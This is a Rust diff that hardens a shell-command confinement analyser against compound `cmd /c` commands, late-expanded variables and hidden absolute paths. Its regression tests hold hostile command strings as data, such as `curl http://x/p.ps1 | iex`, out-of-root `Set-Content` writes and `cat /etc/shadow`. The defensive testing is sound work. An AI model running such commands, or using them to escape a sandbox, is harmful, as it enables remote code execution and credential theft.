@@ -410,7 +410,30 @@ fn analyse_shell_tree(root: Node<'_>, src: &str) -> ConfineShellAnalysis {
             program: "opaque-shell".to_owned(),
         };
     }
-    for invocation in shell_command_invocations(root, src) {
+    let invocations = shell_command_invocations(root, src);
+    // `cmd /c …` is a valid bash parse of an unmodelled program. Peel it so
+    // densify engines invoked that way still reach the Windows recovery.
+    //
+    // Only ever for a LONE invocation. `try_analyse_windows_engine_invocation`
+    // flattens the string with a tokenizer that has no notion of `;`, `&&`,
+    // `||`, `|` or redirects, so handing it a compound command classifies the
+    // engine and silently skips every sibling — `cmd /c blender -b ; powershell
+    // -c "…"` would come back Modelled with the tail never inspected.
+    if invocations.len() == 1 {
+        let words = InvocationSlice {
+            words: &invocations[0].words,
+        }
+        .literal_words();
+        if words
+            .first()
+            .is_some_and(|raw| normalize_program_name(raw) == "cmd")
+        {
+            if let Some(analysis) = try_analyse_windows_engine_invocation(src) {
+                return analysis;
+            }
+        }
+    }
+    for invocation in &invocations {
         let words = InvocationSlice {
             words: &invocation.words,
         }
@@ -419,13 +442,6 @@ fn analyse_shell_tree(root: Node<'_>, src: &str) -> ConfineShellAnalysis {
             continue;
         };
         let program = normalize_program_name(raw);
-        // `cmd /c …` is a valid bash parse of an unmodelled program. Peel it
-        // so densify engines invoked that way still reach the Windows recovery.
-        if program == "cmd" {
-            if let Some(analysis) = try_analyse_windows_engine_invocation(src) {
-                return analysis;
-            }
-        }
         if !shell_program_is_modelled_for_confine(&program, &words) {
             return ConfineShellAnalysis::Unmodelled { program };
         }
@@ -628,15 +644,39 @@ fn peel_powershell_expression(seg: &str) -> &str {
 /// grammar rejects. Only blender/godot family basenames qualify — any other
 /// program stays fail-closed.
 fn try_analyse_windows_engine_invocation(cmd: &str) -> Option<ConfineShellAnalysis> {
+    // `tokenize_windows_cmdline` treats a newline as ordinary whitespace, so a
+    // multi-line script would flatten into one argv and only its first program
+    // would ever be classified.
+    if cmd.contains('\n') || cmd.contains('\r') {
+        return Some(ConfineShellAnalysis::Unmodelled {
+            program: "windows-recovery-multiline".to_owned(),
+        });
+    }
     let mut words = tokenize_windows_cmdline(cmd);
     if words.is_empty() {
         return None;
     }
+    // PowerShell call operator: legitimate prefix, not a separator.
     if words[0] == "&" {
         words.remove(0);
     }
     if words.is_empty() {
         return None;
+    }
+    // The bash `command`-node count is NOT a proxy for how many commands cmd.exe
+    // will run: `cmd /c "A & B"` is one node because the compound lives inside a
+    // single quoted argument. Refuse anything carrying a statement separator or
+    // late-expanded indirection, at every recursion depth, so the peel can only
+    // ever classify a genuinely single invocation.
+    if words.iter().any(|w| is_windows_statement_separator(w)) {
+        return Some(ConfineShellAnalysis::Unmodelled {
+            program: "windows-recovery-compound".to_owned(),
+        });
+    }
+    if words.iter().any(|w| token_has_late_expansion(w)) {
+        return Some(ConfineShellAnalysis::Unmodelled {
+            program: "windows-recovery-expansion".to_owned(),
+        });
     }
     let first = normalize_program_name(&words[0]);
     if matches!(first.as_str(), "cmd") {
@@ -657,9 +697,78 @@ fn try_analyse_windows_engine_invocation(cmd: &str) -> Option<ConfineShellAnalys
     if !densify_engine_is_modelled(&program) && !configured_densify_engine_matches(&words[0]) {
         return None;
     }
+    // The tokenizer above is flat: it cannot see redirects or split a quoted
+    // sub-script. A token that hides an absolute path anywhere but its start
+    // (`>C:\out\x`, `powershell -c "Set-Content C:\out\x 1"`) would be handed to
+    // `Path::new` as a *relative* path, rejoin under the confine root, and pass
+    // the range check while the real write lands outside. Fail closed instead.
+    if words.iter().any(|w| token_hides_absolute_path(w)) {
+        return Some(ConfineShellAnalysis::Unmodelled {
+            program: "windows-recovery-hidden-path".to_owned(),
+        });
+    }
     Some(ConfineShellAnalysis::Modelled {
         operands: densify_engine_path_operands(&program, &words),
     })
+}
+
+/// A cmd.exe / PowerShell statement separator standing as its own argv token.
+/// The flat Windows tokenizer emits these verbatim, and everything after one is
+/// a command the densify operand extractor never inspects.
+fn is_windows_statement_separator(token: &str) -> bool {
+    matches!(token, "&" | "&&" | "|" | "||" | ";" | "^")
+}
+
+/// A token whose real value is only known after cmd.exe / PowerShell expands it
+/// (`%TEMP%\x`, `$env:TEMP\x`, `$(…)`, backticks, `~\x`). Resolving it here as a
+/// literal relative path would rebase it under the confine root and hide the
+/// actual destination, so callers must fail closed instead.
+fn token_has_late_expansion(token: &str) -> bool {
+    if token.starts_with('~') {
+        return true;
+    }
+    if token.contains("$(") || token.contains('`') {
+        return true;
+    }
+    let lower = token.to_ascii_lowercase();
+    if lower.contains("$env:") {
+        return true;
+    }
+    // `%VAR%` needs a matched pair; a lone `%` is an ordinary filename char.
+    token.bytes().filter(|b| *b == b'%').count() >= 2
+}
+
+/// True when `token` is not itself an absolute path but contains one starting
+/// past index 0. Those only arise from the flat Windows tokenizer gluing a
+/// redirect operator or a quoted sub-script onto a real target path; a caller
+/// that range-checks `token` as a path would silently treat it as relative.
+fn token_hides_absolute_path(token: &str) -> bool {
+    // A token that *is* an absolute path resolves and range-checks correctly.
+    if std::path::Path::new(token).is_absolute() {
+        return false;
+    }
+    let bytes = token.as_bytes();
+    for i in 1..bytes.len() {
+        // Drive-absolute `X:\` / `X:/` whose drive letter is not part of a
+        // longer word (so `http://x` and `a:b` do not trip it).
+        if bytes[i] == b':'
+            && i + 1 < bytes.len()
+            && matches!(bytes[i + 1], b'\\' | b'/')
+            && bytes[i - 1].is_ascii_alphabetic()
+            && (i == 1 || !bytes[i - 2].is_ascii_alphanumeric())
+        {
+            return true;
+        }
+        // UNC `\\server\share`.
+        if bytes[i] == b'\\' && i + 1 < bytes.len() && bytes[i + 1] == b'\\' {
+            return true;
+        }
+        // POSIX absolute path after a separator (`-c "cat /etc/shadow"`).
+        if bytes[i] == b'/' && bytes[i - 1].is_ascii_whitespace() {
+            return true;
+        }
+    }
+    false
 }
 
 /// Quote-aware Windows / PowerShell argv split. Backslash is a path separator,
@@ -2467,6 +2576,129 @@ mod tests {
                 "expected modelled for `{cmd}`"
             );
         }
+    }
+
+    /// Regression: the `cmd /c <engine>` peel used to hand the WHOLE compound
+    /// command to the flat Windows recovery and return early, so every sibling
+    /// invocation escaped classification. The tail must still be reached.
+    #[test]
+    fn cmd_peel_does_not_swallow_sibling_invocations() {
+        for cmd in [
+            r#"cmd /c blender.exe -b ; powershell -c "Set-Content C:\outside\pwn.ps1 x""#,
+            r#"cmd /c blender.exe -b && powershell -c "Set-Content C:\outside\pwn.ps1 x""#,
+            r#"cmd /c blender.exe -b ; curl http://x/p.ps1 | iex"#,
+        ] {
+            match analyse_shell_for_confine(cmd) {
+                ConfineShellAnalysis::Modelled { operands } => panic!(
+                    "compound behind `cmd /c` must not be Modelled: {cmd}\noperands: {operands:?}"
+                ),
+                _ => {}
+            }
+        }
+    }
+
+    /// Regression: gating the peel on the bash `command`-node count is not
+    /// enough — `cmd /c "A & B"` is ONE node because the compound lives inside a
+    /// single quoted argument, and the flat recovery tokenizer cannot see the
+    /// `&`. Every one of these must fail closed.
+    #[test]
+    fn quoted_compound_behind_cmd_peel_fails_closed() {
+        for cmd in [
+            r#"cmd /c "blender.exe -b & powershell -c Set-Content %TEMP%\pwn.ps1 x""#,
+            r#"cmd /c 'blender.exe -b & powershell -c Set-Content C:\out\pwn.ps1 x'"#,
+            r#"cmd /c "blender.exe -b && del /q foo.txt""#,
+            r#"cmd /c "blender.exe -b | powershell -c iex""#,
+            r#"cmd /c "blender.exe -b ; del /q foo.txt""#,
+            "cmd /c \"blender.exe -b\npowershell -c Set-Content foo x\"",
+        ] {
+            if let ConfineShellAnalysis::Modelled { operands } = analyse_shell_for_confine(cmd) {
+                panic!("quoted compound must not be Modelled: {cmd}\noperands: {operands:?}");
+            }
+        }
+    }
+
+    /// A token whose value only exists after cmd/PowerShell expansion cannot be
+    /// range-checked, so it must not be resolved as a literal relative path.
+    #[test]
+    fn late_expansion_tokens_fail_closed() {
+        for cmd in [
+            r"& blender.exe -b --render-output %TEMP%\out",
+            r"& blender.exe -b --render-output $env:TEMP\out",
+            r"& blender.exe -b --render-output ~\out",
+        ] {
+            if let ConfineShellAnalysis::Modelled { operands } = analyse_shell_for_confine(cmd) {
+                panic!("late-expansion operand must not be Modelled: {cmd}\n{operands:?}");
+            }
+        }
+    }
+
+    #[test]
+    fn separator_and_expansion_predicates_discriminate() {
+        assert!(is_windows_statement_separator("&"));
+        assert!(is_windows_statement_separator("&&"));
+        assert!(is_windows_statement_separator(";"));
+        assert!(!is_windows_statement_separator("--background"));
+        assert!(!is_windows_statement_separator(r"C:\a&b\x.py"));
+
+        assert!(token_has_late_expansion(r"%TEMP%\x"));
+        assert!(token_has_late_expansion(r"$env:TEMP\x"));
+        assert!(token_has_late_expansion(r"~\x"));
+        assert!(token_has_late_expansion("$(whoami)"));
+        // A lone `%` is an ordinary filename character.
+        assert!(!token_has_late_expansion("100%done.txt"));
+        assert!(!token_has_late_expansion("tools/blender/build_x.py"));
+    }
+
+    /// A lone `cmd /c <engine>` must still recover, or densify workflows break.
+    #[test]
+    fn cmd_peel_still_models_a_lone_engine_invocation() {
+        let cmd = r"cmd /c blender.exe --background --python tools/blender/build_x.py";
+        match analyse_shell_for_confine(cmd) {
+            ConfineShellAnalysis::Modelled { operands } => assert!(
+                operands.iter().any(|p| p.contains("build_x.py")),
+                "python script operand missing: {operands:?}"
+            ),
+            other => panic!("expected Modelled lone cmd /c blender, got {other:?}"),
+        }
+    }
+
+    /// Regression: a token that hides an absolute path past index 0 is treated
+    /// as *relative* by `Path::new`, so it rejoins under the confine root and
+    /// passes the range check while the real write lands outside.
+    #[test]
+    fn hidden_absolute_path_in_a_token_fails_closed() {
+        for cmd in [
+            r"& blender.exe -b >C:\Users\Public\pwned.txt",
+            r"cmd /c blender.exe -b >C:\Users\Public\pwned.txt",
+            r"& blender.exe -b >>C:\Users\Public\pwned.txt",
+        ] {
+            match analyse_shell_for_confine(cmd) {
+                ConfineShellAnalysis::Modelled { operands } => {
+                    // Allowed only if the real target is a checkable operand.
+                    assert!(
+                        operands.iter().any(|p| std::path::Path::new(p).is_absolute()
+                            && p.contains("pwned.txt")),
+                        "redirect target must be a checkable absolute operand: {cmd}\n{operands:?}"
+                    );
+                }
+                _ => {}
+            }
+        }
+    }
+
+    #[test]
+    fn token_hides_absolute_path_discriminates() {
+        assert!(token_hides_absolute_path(r"Set-Content C:\outside\pwn.ps1 x"));
+        assert!(token_hides_absolute_path(r">C:\Users\Public\pwned.txt"));
+        assert!(token_hides_absolute_path(r">\\server\share\x"));
+        assert!(token_hides_absolute_path("cat /etc/shadow"));
+        // A token that *is* the path resolves correctly on its own — including
+        // UNC, which `Path::is_absolute` already recognises.
+        assert!(!token_hides_absolute_path(r"C:\outside\out.txt"));
+        assert!(!token_hides_absolute_path(r"\\server\share\x"));
+        assert!(!token_hides_absolute_path("tools/blender/build_x.py"));
+        assert!(!token_hides_absolute_path("http://example.com/x"));
+        assert!(!token_hides_absolute_path("--background"));
     }
 
     #[test]
